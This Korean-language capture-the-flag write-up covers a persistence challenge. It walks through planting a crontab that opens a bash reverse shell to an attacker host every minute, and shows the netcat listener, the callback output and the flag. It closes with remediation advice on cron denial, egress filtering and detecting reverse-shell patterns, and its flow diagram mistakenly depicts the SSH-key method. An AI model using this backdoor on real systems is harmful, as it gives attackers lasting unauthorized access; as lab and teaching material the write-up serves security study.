+++
title = "VulnABLE CTF [LUXORA] Write-up: Persistence 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Persistence", "Silver", "Cron Job", "Reverse Shell", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Persistence 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Advanced Layer (Persistence)
- **난이도**: 🥈 Silver
- **타겟 경로**: 시스템 쉘 내부
- **목표**: 시스템 관리자가 의심스러운 `authorized_keys` 파일을 주기적으로 삭제하여 SSH 접근을 막는 환경에서, **리눅스의 예약 작업 스케줄러(Cron Job)**를 악용하여 1분마다 해커의 서버로 스스로 접속(Reverse Shell)하는 영구적인 백도어를 설치하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 분석 (Reconnaissance)

웹 쉘이나 다른 취약점을 통해 `www-data` 권한의 쉘을 획득한 상태입니다.
하지만 이 서버는 주기적으로 보안 스크립트가 돌아가며 `~/.ssh/authorized_keys` 파일을 비워버립니다. (Bronze 방식 차단)

**[해커의 사고 과정]**
1. 내가 능동적으로(Active) 서버에 들어가는 문(SSH)은 자꾸 닫힌다.
2. 그렇다면 서버가 수동적으로(Passive), 즉 "서버가 알아서 내 컴퓨터로 전화를 걸게(Reverse Connection)" 만들어야 한다.
3. 리눅스 시스템에서 가장 완벽하게 "주기적으로 명령어를 자동 실행"해 주는 도구는 바로 **Cron(크론 탭)**이다!
4. 크론 탭에 리버스 쉘(Reverse Shell) 코드를 등록해 두자.

---

## 💥 2. 취약점 식별 및 Cron Job 등록 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Web Shell ] --(Write to ~/.ssh/authorized_keys)--> [ Host OS ]
[ Attacker ]  --(SSH Login with Private Key)-------> [ Host OS ]
                                                     |-- Permanent Access!
```


리눅스의 각 사용자는 자신만의 예약 작업(Crontab)을 가질 수 있습니다.

### 💡 Step 1: 해커 서버에서 리스너(Listener) 대기
해커의 PC(공인 IP가 있다고 가정)에서 서버가 걸어오는 전화를 받을 준비를 합니다. Netcat(`nc`)을 사용합니다.

```bash
$ nc -lvnp 4444
```

### 💡 Step 2: 타겟 서버에 리버스 쉘 크론 탭 등록
타겟 서버의 웹 쉘 창에서 `crontab -e` 명령어 대신, 직접 크론 탭 문자열을 생성하여 주입합니다.
아래 명령어는 매 1분마다(`* * * * *`) 해커의 서버(`10.10.10.99`) 4444 포트로 리버스 쉘을 연결하라는 뜻입니다.

```bash
# 1. 크론 탭 내용 만들기
$ echo "* * * * * bash -c 'bash -i >& /dev/tcp/10.10.10.99/4444 0>&1'" > /tmp/cron_backdoor

# 2. 크론 탭에 등록 적용
$ crontab /tmp/cron_backdoor

# 3. 등록 확인
$ crontab -l
* * * * * bash -c 'bash -i >& /dev/tcp/10.10.10.99/4444 0>&1'
```

---

## 🚀 3. 공격 수행 및 영구 접속 확인

등록을 마쳤다면, 이제 아무것도 하지 않고 가만히 기다립니다. (최대 1분 소요)

### 🔍 리버스 쉘 접속 성공 (Callback)
1분이 지나면 타겟 서버의 크론 데몬이 백그라운드에서 스크립트를 실행합니다. 해커의 Netcat 리스너 화면에 갑자기 서버로부터의 연결이 들어옵니다!

```text
Connection from 192.168.1.100:39482
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
www-data@luxora-prod:/var/www/html$ 
```

서버가 재부팅되거나 기존의 웹 쉘이 삭제되더라도, 크론 탭 설정 파일(`/var/spool/cron/crontabs/www-data`)이 남아있는 한 1분마다 끊임없이 해커에게 쉘을 바치게 됩니다.

플래그를 확인합니다.
```bash
$ cat /flag_persistence_silver.txt
FLAG{PERSIST_🥈_CRONTAB_REVERSE_SHELL_E5F6G7}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

운영체제의 기본 기능인 예약 스케줄러(Cron)를 악용하여 백도어를 심었을 때, 안티바이러스나 방화벽이 이를 정상적인 시스템 동작으로 착각하여 탐지하지 못하는 "Living off the Land (LotL)" 공격의 정석을 보여주었습니다.

**🔥 획득한 플래그:**
`FLAG{PERSIST_🥈_CRONTAB_REVERSE_SHELL_E5F6G7}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
서비스 실행용 계정(`www-data`)에게 쉘 권한과 크론 탭 사용 권한이 부여되어 있는 것이 근본적인 문제입니다.

* **안전한 패치 가이드 (권한 최소화 및 모니터링)**
1. **서비스 계정의 Crontab 사용 차단**: 
   일반적으로 웹 프로세스는 크론 탭을 등록할 이유가 전혀 없습니다. `/etc/cron.deny` 파일에 `www-data`, `nginx` 등의 계정 이름을 추가하여 크론 탭 사용 자체를 원천 차단해야 합니다.
2. **Egress(Outbound) 방화벽 설정**: 
   서버가 외부(인터넷)로 먼저 연결을 시도하는 리버스 쉘 통신을 막기 위해, 서버의 아웃바운드 규칙을 강화해야 합니다. 허용된 IP(패치 서버, API 서버 등) 이외의 모든 외부로 나가는 통신은 차단(Drop)해야 합니다.
3. **프로세스 모니터링 (EDR)**: 
   `bash -i`, `nc -e`, `/dev/tcp` 와 같이 리버스 쉘을 맺을 때 전형적으로 나타나는 명령어 패턴을 EDR(Endpoint Detection and Response)이나 리눅스의 Auditd 로 모니터링하여 즉시 프로세스를 강제 종료(Kill)시켜야 합니다.